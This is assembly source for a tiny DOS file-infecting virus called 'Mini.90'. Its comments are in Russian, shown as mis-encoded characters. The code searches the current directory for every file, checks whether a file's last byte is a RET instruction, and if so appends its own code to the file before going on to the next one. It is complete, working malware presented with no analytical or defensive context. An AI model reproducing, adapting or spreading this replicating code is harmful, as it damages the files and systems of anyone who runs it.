   ; Mini.90 by SMT/SMF
   ; *®à ¦ ¥â ¢á¥ ä ©«ë ¢ â¥ªãé¥© ¤¨à¥ªâ®à¨¨,
   ; ¥á«¨ ®¨ ¨¬¥îâ RET ¢ ª ç¥áâ¢¥ ¯®á«¥¤¥© ª®¬ ¤ë.
   ; €¢â®¬ â¨ç¥áª¨ ¨¬¥¥âáï ª®âà®«ì   ¯®¢â®à®¥ § à ¦¥¨¥ :)



                   model   tiny
                   .286 ;)
                   .code
                   org     100h

   start:          pusha           ; ¬ë ¦¥  ¤¥¥¬áï çâ® íâ  ¯®¤¯à®£à ¬¬  ¡ã¤¥â
                   pushf           ; à ¡®â âì - â®£¤  áª®à¥¥ ¢á¥£® ¢ à¥£¨áà å ¨
                   push    es      ; ä« £ å ¡ã¤ãâ ã¦ë¥ ¯à®£à ¬¬¥ ¤ ë¥
                   push    ds      ; - ¨å â¥àïâì ¥¦¥« â¥«ì®
                   push    cs
                   pop     ds
                   call    $+3
   OFFS:           pop     bp
                   mov     ah,4Eh              ;*®¨áª ¯¥à¢®£® ä ©« 
                   lea     dx,bp[file_spec-OFFS]

   search:
                   int     21h
                   jnc     infect_file         ; …á«¨ ä ©«  ©¤¥, â® ¯®à ¦ ¥¬
                   pop     ds
                   pop     es
                   popf
                   popa
                   ret

   infect_file:
                   mov     ax,3D02h            ; Žâªàë¢ ¥¬ ä ©« ¤«ï çâ¥¨ï
                   mov     dx,9Eh              ; DX ãª §ë¢ ¥â    ©¤¥ë© ä ©«
                   int     21h

                   xchg    bx,ax               ; BX á®¤¥à¦¨â ä ©«®¢ë© handle

                   ;*à®¢¥àï¥¬  «¨ç¨¥ ret ¢ ª®æ¥ ä ©« 
                   call    SeekToEnd           ; á¬¥é ¥¬áï ¢ ª®¥æ

                   mov     ah,3fh              ; ¯à®ç¨â âì, çâ® â ¬ áâ®¨â
                   mov     cx,1
                   lea     dx,bp[buffer-OFFS]
                   int     21h

                   mov     al,1                ; áî¤  áç¨â ¥¬ ¯®á«¥¤¨© ¡ ©â
   buffer          equ     $-1
                   cmp     al,0C3h             ; ret
                   jne     Next                ; ¥á«¨ ¥ ret, â®   Next

                   call    SeekToEnd           ; á¬¥é ¥¬áï ¢ ª®¥æ
                   mov     ah,40h              ; ”ãªæ¨ï § ¯¨á¨ ¢ ä ©«
                   mov     cx,finish-start     ; CL = áª®«ìª® ¡ ©â ¯¨á âì
                                               ; â.ª. ch ¡ë«® ff
                   lea     dx,bp[start-OFFS]
                   int     21h

   Next:
                   mov     ah,3Eh              ; ‡ ªàë¢ ¥¬ ä ©«
                   int     21h

                   mov     ah,4Fh              ; *®¨áª á«¥¤ãîé¥£® ä ©« 
                   jmp     search              ; *¥à¥å®¤   § à ¦¥¨¥
   ;-------------------------------------------
   SeekToEnd:
                   mov     ax,4202h            ; ”ãªæ¨ï á¬¥é¥¨ï ãª § â¥«ï
                                               ; Žâáç¥â ®â ª®æ 
                   xor     cx,cx
                   dec     cx
                   mov     dx,cx               ; á¬¥é¥¨¥ = (-1)

                   int     21h
                   ret
   ;-------------------------------------------

   ; ¯®áª®«ìªã ret ¥ ¢áâà¥â¨âáï ¢® ¢á¥å ¯®¤àï¤ ä ©« å, â® ¬®¦®
   ; ¡¥§ áâà å  ¨á¯®«ì§®¢ âì ¬ áªã '*.*'

   file_spec       db      '*.*',0             ;Œ áª  ä ©«®¢ ¤«ï ¯®¨áª 

   finish  :                                   ;Š®¥æ ¢¨àãá 
                   end     start
